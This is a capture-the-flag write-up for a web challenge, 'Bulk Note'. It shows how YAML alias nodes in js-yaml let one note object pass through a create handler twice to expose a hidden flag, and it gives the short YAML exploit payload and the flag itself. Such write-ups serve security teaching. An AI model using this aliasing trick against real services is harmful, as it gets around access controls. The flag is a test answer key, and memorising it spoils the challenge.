# Bulk Note

[日本語版はこちら](./README-ja.md)

## Description

I made a note app that can create multiple notes! Can you read the hidden note?

## Writeup

### Overview

`POST /` receives YAML data and processes it differently depending on the `command` field. (Note that the `load` function is from `js-yaml`)

```javascript
app.post("/", (req, res) => {
  let parsedDocs;
  try {
    parsedDocs = load(req.body || "");
  } catch (err) {
    /* ... */
  }
  /* ... */
  const results = [];
  for (let i = 0; i < parsedDocs.length; i += 1) {
    const doc = parsedDocs[i];
    /* ... */
    const command = doc.command;
    /* ... */
    const handler = commandHandlers[command];
    const [result, error] = handler(doc, i, req.sessionId);
    if (error) {
      return res.status(400).json(error);
    }
    results.push(result);
  }

  return res.status(200).json({ results });
});
```

The only way to access the flag is to use the `create` command:

```javascript
function handleCreateCommand(doc, index, sessionId) {
  const content = doc.content;
  /* ... */
  const id = randomUUID();
  doc.sessionId = sessionId;
  if (doc.isHidden) {
    doc.content = FLAG;
    delete doc.sessionId;
    delete doc.isHidden;
  }
  notes.set(id, doc);

  return [
    {
      command: "create",
      id,
    },
    null,
  ];
}
```

However, it is not that simple:
* If `isHidden` is true, the content is set to the flag, but the associated session ID will be undefined. Hence, you won't be able to retrieve it with the `get` command.
* If `isHidden` is false, you can see the content with the `get` command, but the content remains as provided.

### Vulnerability

The first thing to notice is that **if you can somehow make the same `doc` object go through `handleCreateCommand` twice, you will be able to see the flag through the `get` command**. 
* In the first execution, `content` is set to the flag, and `sessionId` and `isHidden` are deleted.
* In the second execution, `sessionId` will be restored. Since the `isHidden` field was already deleted, it will not be deleted again.

How can we make the same object go through the `create` command twice? You can use **[alias nodes](https://yaml.org/spec/1.2.2/#71-alias-nodes)**. 

```yaml
first: &v
  foo: bar
second: *v
# JSON equivalent: {"first":{"foo":"bar"},"second":{"foo":"bar"}}
```

This is not a shorthand that copies the same value to another place. This actually makes it so that both keys reference the same object.

```javascript
import { load } from "js-yaml";

const parsed = load(`
first: &v
  foo: bar
second: *v
`);

console.log(parsed) // { first: { foo: 'bar' }, second: { foo: 'bar' } }

parsed.first.foo = "changed";

console.log(parsed) // { first: { foo: 'changed' }, second: { foo: 'changed' } }
```

This is exactly what is needed. 

```yaml
- &anchor
  command: create
  content: foobar
  isHidden: true
- *anchor
```

See [solver.py](./solver.py) for the full solve script.

## Flag

`Alpaca{y4ml_1snt_bett3r_JS0N}`
